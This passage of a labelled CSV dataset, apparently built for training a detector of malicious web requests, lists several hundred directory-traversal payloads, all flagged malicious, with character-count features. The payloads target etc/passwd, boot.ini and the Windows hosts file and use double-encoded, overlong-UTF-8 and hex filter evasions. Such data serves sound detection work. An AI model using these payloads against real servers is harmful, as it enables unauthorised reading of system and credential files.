,payloads,length,nonprintable_keywords,special_chars,punctuation_chars,js_events,html_tags,sql_keywords,percentage_count,spaces_count,is_malicious
7125,.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259cetc%25c1%259cissue,108,0,44,44,0,0,0,14,0,1
7126,.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259cboot.ini,98,0,43,43,0,0,0,12,0,1
7127,.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259c.../.%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts,160,0,50,50,0,0,0,20,0,1
7128,.../.%25c0%25afetc%25c0%25afpasswd,34,0,9,9,0,0,0,4,0,1
7129,.../.%25c0%25afetc%25c0%25afissue,33,0,9,9,0,0,0,4,0,1
7130,.../.%25c0%25afboot.ini,23,0,8,8,0,0,0,2,0,1
7131,.../.%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts,85,0,15,15,0,0,0,10,0,1
7132,.../.%25c0%25af.../.%25c0%25afetc%25c0%25afpasswd,49,0,16,16,0,0,0,6,0,1
7133,.../.%25c0%25af.../.%25c0%25afetc%25c0%25afissue,48,0,16,16,0,0,0,6,0,1
7134,.../.%25c0%25af.../.%25c0%25afboot.ini,38,0,15,15,0,0,0,4,0,1
7135,.../.%25c0%25af.../.%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts,100,0,22,22,0,0,0,12,0,1
7136,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afetc%25c0%25afpasswd,64,0,23,23,0,0,0,8,0,1
7137,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afetc%25c0%25afissue,63,0,23,23,0,0,0,8,0,1
7138,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afboot.ini,53,0,22,22,0,0,0,6,0,1
7139,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts,115,0,29,29,0,0,0,14,0,1
7140,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afetc%25c0%25afpasswd,79,0,30,30,0,0,0,10,0,1
7141,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afetc%25c0%25afissue,78,0,30,30,0,0,0,10,0,1
7142,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afboot.ini,68,0,29,29,0,0,0,8,0,1
7143,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts,130,0,36,36,0,0,0,16,0,1
7144,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afetc%25c0%25afpasswd,94,0,37,37,0,0,0,12,0,1
7145,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afetc%25c0%25afissue,93,0,37,37,0,0,0,12,0,1
7146,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afboot.ini,83,0,36,36,0,0,0,10,0,1
7147,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts,145,0,43,43,0,0,0,18,0,1
7148,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afetc%25c0%25afpasswd,109,0,44,44,0,0,0,14,0,1
7149,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afetc%25c0%25afissue,108,0,44,44,0,0,0,14,0,1
7150,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afboot.ini,98,0,43,43,0,0,0,12,0,1
7151,.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25af.../.%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts,160,0,50,50,0,0,0,20,0,1
7152,.../.%f0%80%80%afetc%f0%80%80%afpasswd,38,0,13,13,0,0,0,8,0,1
7153,.../.%f0%80%80%afetc%f0%80%80%afissue,37,0,13,13,0,0,0,8,0,1
7154,.../.%f0%80%80%afboot.ini,25,0,10,10,0,0,0,4,0,1
7155,.../.%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,95,0,25,25,0,0,0,20,0,1
7156,.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afpasswd,55,0,22,22,0,0,0,12,0,1
7157,.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afissue,54,0,22,22,0,0,0,12,0,1
7158,.../.%f0%80%80%af.../.%f0%80%80%afboot.ini,42,0,19,19,0,0,0,8,0,1
7159,.../.%f0%80%80%af.../.%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,112,0,34,34,0,0,0,24,0,1
7160,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afpasswd,72,0,31,31,0,0,0,16,0,1
7161,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afissue,71,0,31,31,0,0,0,16,0,1
7162,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afboot.ini,59,0,28,28,0,0,0,12,0,1
7163,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,129,0,43,43,0,0,0,28,0,1
7164,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afpasswd,89,0,40,40,0,0,0,20,0,1
7165,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afissue,88,0,40,40,0,0,0,20,0,1
7166,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afboot.ini,76,0,37,37,0,0,0,16,0,1
7167,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,146,0,52,52,0,0,0,32,0,1
7168,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afpasswd,106,0,49,49,0,0,0,24,0,1
7169,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afissue,105,0,49,49,0,0,0,24,0,1
7170,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afboot.ini,93,0,46,46,0,0,0,20,0,1
7171,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,163,0,61,61,0,0,0,36,0,1
7172,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afpasswd,123,0,58,58,0,0,0,28,0,1
7173,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afetc%f0%80%80%afissue,122,0,58,58,0,0,0,28,0,1
7174,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afboot.ini,110,0,55,55,0,0,0,24,0,1
7175,.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%af.../.%f0%80%80%afwindows%f0%80%80%afsystem32%f0%80%80%afdrivers%f0%80%80%afetc%f0%80%80%afhosts,180,0,70,70,0,0,0,40,0,1
7176,.../.%f8%80%80%80%afetc%f8%80%80%80%afpasswd,44,0,15,15,0,0,0,10,0,1
7177,.../.%f8%80%80%80%afetc%f8%80%80%80%afissue,43,0,15,15,0,0,0,10,0,1
7178,.../.%f8%80%80%80%afboot.ini,28,0,11,11,0,0,0,5,0,1
7179,.../.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,110,0,30,30,0,0,0,25,0,1
7180,.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afpasswd,64,0,25,25,0,0,0,15,0,1
7181,.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afissue,63,0,25,25,0,0,0,15,0,1
7182,.../.%f8%80%80%80%af.../.%f8%80%80%80%afboot.ini,48,0,21,21,0,0,0,10,0,1
7183,.../.%f8%80%80%80%af.../.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,130,0,40,40,0,0,0,30,0,1
7184,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afpasswd,84,0,35,35,0,0,0,20,0,1
7185,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afissue,83,0,35,35,0,0,0,20,0,1
7186,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afboot.ini,68,0,31,31,0,0,0,15,0,1
7187,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,150,0,50,50,0,0,0,35,0,1
7188,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afpasswd,104,0,45,45,0,0,0,25,0,1
7189,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afissue,103,0,45,45,0,0,0,25,0,1
7190,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afboot.ini,88,0,41,41,0,0,0,20,0,1
7191,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,170,0,60,60,0,0,0,40,0,1
7192,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afpasswd,124,0,55,55,0,0,0,30,0,1
7193,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afissue,123,0,55,55,0,0,0,30,0,1
7194,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afboot.ini,108,0,51,51,0,0,0,25,0,1
7195,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,190,0,70,70,0,0,0,45,0,1
7196,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afpasswd,144,0,65,65,0,0,0,35,0,1
7197,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afetc%f8%80%80%80%afissue,143,0,65,65,0,0,0,35,0,1
7198,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afboot.ini,128,0,61,61,0,0,0,30,0,1
7199,.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%af.../.%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts,210,0,80,80,0,0,0,50,0,1
7200,....//etc//passwd,17,0,8,8,0,0,0,0,0,1
7201,....//etc//issue,16,0,8,8,0,0,0,0,0,1
7202,....//boot.ini,14,0,7,7,0,0,0,0,0,1
7203,....//windows//system32//drivers//etc//hosts,44,0,14,14,0,0,0,0,0,1
7204,....//....//etc//passwd,23,0,14,14,0,0,0,0,0,1
7205,....//....//etc//issue,22,0,14,14,0,0,0,0,0,1
7206,....//....//boot.ini,20,0,13,13,0,0,0,0,0,1
7207,....//....//windows//system32//drivers//etc//hosts,50,0,20,20,0,0,0,0,0,1
7208,....//....//....//etc//passwd,29,0,20,20,0,0,0,0,0,1
7209,....//....//....//etc//issue,28,0,20,20,0,0,0,0,0,1
7210,....//....//....//boot.ini,26,0,19,19,0,0,0,0,0,1
7211,....//....//....//windows//system32//drivers//etc//hosts,56,0,26,26,0,0,0,0,0,1
7212,....//....//....//....//etc//passwd,35,0,26,26,0,0,0,0,0,1
7213,....//....//....//....//etc//issue,34,0,26,26,0,0,0,0,0,1
7214,....//....//....//....//boot.ini,32,0,25,25,0,0,0,0,0,1
7215,....//....//....//....//windows//system32//drivers//etc//hosts,62,0,32,32,0,0,0,0,0,1
7216,....//....//....//....//....//etc//passwd,41,0,32,32,0,0,0,0,0,1
7217,....//....//....//....//....//etc//issue,40,0,32,32,0,0,0,0,0,1
7218,....//....//....//....//....//boot.ini,38,0,31,31,0,0,0,0,0,1
7219,....//....//....//....//....//windows//system32//drivers//etc//hosts,68,0,38,38,0,0,0,0,0,1
7220,....//....//....//....//....//....//etc//passwd,47,0,38,38,0,0,0,0,0,1
7221,....//....//....//....//....//....//etc//issue,46,0,38,38,0,0,0,0,0,1
7222,....//....//....//....//....//....//boot.ini,44,0,37,37,0,0,0,0,0,1
7223,....//....//....//....//....//....//windows//system32//drivers//etc//hosts,74,0,44,44,0,0,0,0,0,1
7224,..../\etc/\passwd,17,0,8,8,0,0,0,0,0,1
7225,..../\etc/\issue,16,0,8,8,0,0,0,0,0,1
7226,..../\boot.ini,14,0,7,7,0,0,0,0,0,1
7227,..../\windows/\system32/\drivers/\etc/\hosts,44,0,14,14,0,0,0,0,0,1
7228,..../\..../\etc/\passwd,23,0,14,14,0,0,0,0,0,1
7229,..../\..../\etc/\issue,22,0,14,14,0,0,0,0,0,1
7230,..../\..../\boot.ini,20,0,13,13,0,0,0,0,0,1
7231,..../\..../\windows/\system32/\drivers/\etc/\hosts,50,0,20,20,0,0,0,0,0,1
7232,..../\..../\..../\etc/\passwd,29,0,20,20,0,0,0,0,0,1
7233,..../\..../\..../\etc/\issue,28,0,20,20,0,0,0,0,0,1
7234,..../\..../\..../\boot.ini,26,0,19,19,0,0,0,0,0,1
7235,..../\..../\..../\windows/\system32/\drivers/\etc/\hosts,56,0,26,26,0,0,0,0,0,1
7236,..../\..../\..../\..../\etc/\passwd,35,0,26,26,0,0,0,0,0,1
7237,..../\..../\..../\..../\etc/\issue,34,0,26,26,0,0,0,0,0,1
7238,..../\..../\..../\..../\boot.ini,32,0,25,25,0,0,0,0,0,1
7239,..../\..../\..../\..../\windows/\system32/\drivers/\etc/\hosts,62,0,32,32,0,0,0,0,0,1
7240,..../\..../\..../\..../\..../\etc/\passwd,41,0,32,32,0,0,0,0,0,1
7241,..../\..../\..../\..../\..../\etc/\issue,40,0,32,32,0,0,0,0,0,1
7242,..../\..../\..../\..../\..../\boot.ini,38,0,31,31,0,0,0,0,0,1
7243,..../\..../\..../\..../\..../\windows/\system32/\drivers/\etc/\hosts,68,0,38,38,0,0,0,0,0,1
7244,..../\..../\..../\..../\..../\..../\etc/\passwd,47,0,38,38,0,0,0,0,0,1
7245,..../\..../\..../\..../\..../\..../\etc/\issue,46,0,38,38,0,0,0,0,0,1
7246,..../\..../\..../\..../\..../\..../\boot.ini,44,0,37,37,0,0,0,0,0,1
7247,..../\..../\..../\..../\..../\..../\windows/\system32/\drivers/\etc/\hosts,74,0,44,44,0,0,0,0,0,1
7248,..../%2fetc%2fpasswd,20,0,7,7,0,0,0,2,0,1
7249,..../%2fetc%2fissue,19,0,7,7,0,0,0,2,0,1
7250,..../%2fboot.ini,16,0,7,7,0,0,0,1,0,1
7251,..../%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,50,0,10,10,0,0,0,5,0,1
7252,..../%2f..../%2fetc%2fpasswd,28,0,13,13,0,0,0,3,0,1
7253,..../%2f..../%2fetc%2fissue,27,0,13,13,0,0,0,3,0,1
7254,..../%2f..../%2fboot.ini,24,0,13,13,0,0,0,2,0,1
7255,..../%2f..../%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,58,0,16,16,0,0,0,6,0,1
7256,..../%2f..../%2f..../%2fetc%2fpasswd,36,0,19,19,0,0,0,4,0,1
7257,..../%2f..../%2f..../%2fetc%2fissue,35,0,19,19,0,0,0,4,0,1
7258,..../%2f..../%2f..../%2fboot.ini,32,0,19,19,0,0,0,3,0,1
7259,..../%2f..../%2f..../%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,66,0,22,22,0,0,0,7,0,1
7260,..../%2f..../%2f..../%2f..../%2fetc%2fpasswd,44,0,25,25,0,0,0,5,0,1
7261,..../%2f..../%2f..../%2f..../%2fetc%2fissue,43,0,25,25,0,0,0,5,0,1
7262,..../%2f..../%2f..../%2f..../%2fboot.ini,40,0,25,25,0,0,0,4,0,1
7263,..../%2f..../%2f..../%2f..../%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,74,0,28,28,0,0,0,8,0,1
7264,..../%2f..../%2f..../%2f..../%2f..../%2fetc%2fpasswd,52,0,31,31,0,0,0,6,0,1
7265,..../%2f..../%2f..../%2f..../%2f..../%2fetc%2fissue,51,0,31,31,0,0,0,6,0,1
7266,..../%2f..../%2f..../%2f..../%2f..../%2fboot.ini,48,0,31,31,0,0,0,5,0,1
7267,..../%2f..../%2f..../%2f..../%2f..../%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,82,0,34,34,0,0,0,9,0,1
7268,..../%2f..../%2f..../%2f..../%2f..../%2f..../%2fetc%2fpasswd,60,0,37,37,0,0,0,7,0,1
7269,..../%2f..../%2f..../%2f..../%2f..../%2f..../%2fetc%2fissue,59,0,37,37,0,0,0,7,0,1
7270,..../%2f..../%2f..../%2f..../%2f..../%2f..../%2fboot.ini,56,0,37,37,0,0,0,6,0,1
7271,..../%2f..../%2f..../%2f..../%2f..../%2f..../%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,90,0,40,40,0,0,0,10,0,1
7272,..../%5cetc%5cpasswd,20,0,7,7,0,0,0,2,0,1
7273,..../%5cetc%5cissue,19,0,7,7,0,0,0,2,0,1
7274,..../%5cboot.ini,16,0,7,7,0,0,0,1,0,1
7275,..../%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,50,0,10,10,0,0,0,5,0,1
7276,..../%5c..../%5cetc%5cpasswd,28,0,13,13,0,0,0,3,0,1
7277,..../%5c..../%5cetc%5cissue,27,0,13,13,0,0,0,3,0,1
7278,..../%5c..../%5cboot.ini,24,0,13,13,0,0,0,2,0,1
7279,..../%5c..../%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,58,0,16,16,0,0,0,6,0,1
7280,..../%5c..../%5c..../%5cetc%5cpasswd,36,0,19,19,0,0,0,4,0,1
7281,..../%5c..../%5c..../%5cetc%5cissue,35,0,19,19,0,0,0,4,0,1
7282,..../%5c..../%5c..../%5cboot.ini,32,0,19,19,0,0,0,3,0,1
7283,..../%5c..../%5c..../%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,66,0,22,22,0,0,0,7,0,1
7284,..../%5c..../%5c..../%5c..../%5cetc%5cpasswd,44,0,25,25,0,0,0,5,0,1
7285,..../%5c..../%5c..../%5c..../%5cetc%5cissue,43,0,25,25,0,0,0,5,0,1
7286,..../%5c..../%5c..../%5c..../%5cboot.ini,40,0,25,25,0,0,0,4,0,1
7287,..../%5c..../%5c..../%5c..../%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,74,0,28,28,0,0,0,8,0,1
7288,..../%5c..../%5c..../%5c..../%5c..../%5cetc%5cpasswd,52,0,31,31,0,0,0,6,0,1
7289,..../%5c..../%5c..../%5c..../%5c..../%5cetc%5cissue,51,0,31,31,0,0,0,6,0,1
7290,..../%5c..../%5c..../%5c..../%5c..../%5cboot.ini,48,0,31,31,0,0,0,5,0,1
7291,..../%5c..../%5c..../%5c..../%5c..../%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,82,0,34,34,0,0,0,9,0,1
7292,..../%5c..../%5c..../%5c..../%5c..../%5c..../%5cetc%5cpasswd,60,0,37,37,0,0,0,7,0,1
7293,..../%5c..../%5c..../%5c..../%5c..../%5c..../%5cetc%5cissue,59,0,37,37,0,0,0,7,0,1
7294,..../%5c..../%5c..../%5c..../%5c..../%5c..../%5cboot.ini,56,0,37,37,0,0,0,6,0,1
7295,..../%5c..../%5c..../%5c..../%5c..../%5c..../%5cwindows%5csystem32%5cdrivers%5cetc%5chosts,90,0,40,40,0,0,0,10,0,1
7296,..../0x2fetc0x2fpasswd,22,0,5,5,0,0,0,0,0,1
7297,..../0x2fetc0x2fissue,21,0,5,5,0,0,0,0,0,1
7298,..../0x2fboot.ini,17,0,6,6,0,0,0,0,0,1
7299,..../0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,55,0,5,5,0,0,0,0,0,1
7300,..../0x2f..../0x2fetc0x2fpasswd,31,0,10,10,0,0,0,0,0,1
7301,..../0x2f..../0x2fetc0x2fissue,30,0,10,10,0,0,0,0,0,1
7302,..../0x2f..../0x2fboot.ini,26,0,11,11,0,0,0,0,0,1
7303,..../0x2f..../0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,64,0,10,10,0,0,0,0,0,1
7304,..../0x2f..../0x2f..../0x2fetc0x2fpasswd,40,0,15,15,0,0,0,0,0,1
7305,..../0x2f..../0x2f..../0x2fetc0x2fissue,39,0,15,15,0,0,0,0,0,1
7306,..../0x2f..../0x2f..../0x2fboot.ini,35,0,16,16,0,0,0,0,0,1
7307,..../0x2f..../0x2f..../0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,73,0,15,15,0,0,0,0,0,1
7308,..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fpasswd,49,0,20,20,0,0,0,0,0,1
7309,..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fissue,48,0,20,20,0,0,0,0,0,1
7310,..../0x2f..../0x2f..../0x2f..../0x2fboot.ini,44,0,21,21,0,0,0,0,0,1
7311,..../0x2f..../0x2f..../0x2f..../0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,82,0,20,20,0,0,0,0,0,1
7312,..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fpasswd,58,0,25,25,0,0,0,0,0,1
7313,..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fissue,57,0,25,25,0,0,0,0,0,1
7314,..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fboot.ini,53,0,26,26,0,0,0,0,0,1
7315,..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,91,0,25,25,0,0,0,0,0,1
7316,..../0x2f..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fpasswd,67,0,30,30,0,0,0,0,0,1
7317,..../0x2f..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fetc0x2fissue,66,0,30,30,0,0,0,0,0,1
7318,..../0x2f..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fboot.ini,62,0,31,31,0,0,0,0,0,1
7319,..../0x2f..../0x2f..../0x2f..../0x2f..../0x2f..../0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts,100,0,30,30,0,0,0,0,0,1
7320,..../0x5cetc0x5cpasswd,22,0,5,5,0,0,0,0,0,1
7321,..../0x5cetc0x5cissue,21,0,5,5,0,0,0,0,0,1
7322,..../0x5cboot.ini,17,0,6,6,0,0,0,0,0,1
7323,..../0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,55,0,5,5,0,0,0,0,0,1
7324,..../0x5c..../0x5cetc0x5cpasswd,31,0,10,10,0,0,0,0,0,1
7325,..../0x5c..../0x5cetc0x5cissue,30,0,10,10,0,0,0,0,0,1
7326,..../0x5c..../0x5cboot.ini,26,0,11,11,0,0,0,0,0,1
7327,..../0x5c..../0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,64,0,10,10,0,0,0,0,0,1
7328,..../0x5c..../0x5c..../0x5cetc0x5cpasswd,40,0,15,15,0,0,0,0,0,1
7329,..../0x5c..../0x5c..../0x5cetc0x5cissue,39,0,15,15,0,0,0,0,0,1
7330,..../0x5c..../0x5c..../0x5cboot.ini,35,0,16,16,0,0,0,0,0,1
7331,..../0x5c..../0x5c..../0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,73,0,15,15,0,0,0,0,0,1
7332,..../0x5c..../0x5c..../0x5c..../0x5cetc0x5cpasswd,49,0,20,20,0,0,0,0,0,1
7333,..../0x5c..../0x5c..../0x5c..../0x5cetc0x5cissue,48,0,20,20,0,0,0,0,0,1
7334,..../0x5c..../0x5c..../0x5c..../0x5cboot.ini,44,0,21,21,0,0,0,0,0,1
7335,..../0x5c..../0x5c..../0x5c..../0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,82,0,20,20,0,0,0,0,0,1
7336,..../0x5c..../0x5c..../0x5c..../0x5c..../0x5cetc0x5cpasswd,58,0,25,25,0,0,0,0,0,1
7337,..../0x5c..../0x5c..../0x5c..../0x5c..../0x5cetc0x5cissue,57,0,25,25,0,0,0,0,0,1
7338,..../0x5c..../0x5c..../0x5c..../0x5c..../0x5cboot.ini,53,0,26,26,0,0,0,0,0,1
7339,..../0x5c..../0x5c..../0x5c..../0x5c..../0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,91,0,25,25,0,0,0,0,0,1
7340,..../0x5c..../0x5c..../0x5c..../0x5c..../0x5c..../0x5cetc0x5cpasswd,67,0,30,30,0,0,0,0,0,1
7341,..../0x5c..../0x5c..../0x5c..../0x5c..../0x5c..../0x5cetc0x5cissue,66,0,30,30,0,0,0,0,0,1
7342,..../0x5c..../0x5c..../0x5c..../0x5c..../0x5c..../0x5cboot.ini,62,0,31,31,0,0,0,0,0,1
